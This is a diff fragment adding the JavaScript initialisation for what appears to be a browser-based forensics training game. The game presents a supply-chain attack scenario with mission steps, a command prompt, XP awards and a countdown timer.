+            if (window.FirestoreManager) {
+                const uid = localStorage.getItem('hexworth_uid');
+                if (uid) FirestoreManager.addXP(uid, amount, 'git blame (partial)');
+            }
+        }
+
+        // ============= INITIALIZATION =============
+        async function init() {
+            AudioEngine.init();
+
+            const input = document.getElementById('command-input');
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    const cmd = input.value;
+                    handleCommand(cmd);
+                    input.value = '';
+                }
+            });
+
+            // Intro sequence
+            await Output.printTyped('Initializing forensics terminal...', 'dim', 30);
+            await Output.print('', '', 300);
+            await Output.print('<span class="warning">⚠ SECURITY ALERT ⚠</span>');
+            await Output.print('', '', 200);
+            await Output.printTyped('Supply chain attack detected in CI/CD pipeline.', 'error', 25);
+            await Output.printTyped('Malicious dependency injected approximately 3 weeks ago.', 'error', 25);
+            await Output.printTyped('Automated production deploy scheduled in 60 minutes.', 'warning', 25);
+            await Output.print('', '', 500);
+            Output.print('<span class="highlight">YOUR MISSION:</span>');
+            Output.print('1. Identify the malicious commit');
+            Output.print('2. Trace the attack vector');
+            Output.print('3. Block the production deploy');
+            Output.print('4. Identify the attacker');
+            await Output.print('', '', 300);
+            Output.print('<span class="success">Type "help" to see available commands.</span>');
+            Output.print('<span class="dim">Hint: Start with "git log" to review commit history.</span>');
+            Output.print('');
+
+            startTimer();
+            input.focus();
+        }
+
+        // Start game when page loads
+        window.addEventListener('load', init);
+    </script>
+
+    <script src="../../../components/FluxCapacitor.js"></script>
+    <script src="../../../components/AchievementManager.js"></script>
+</body>
+</html>
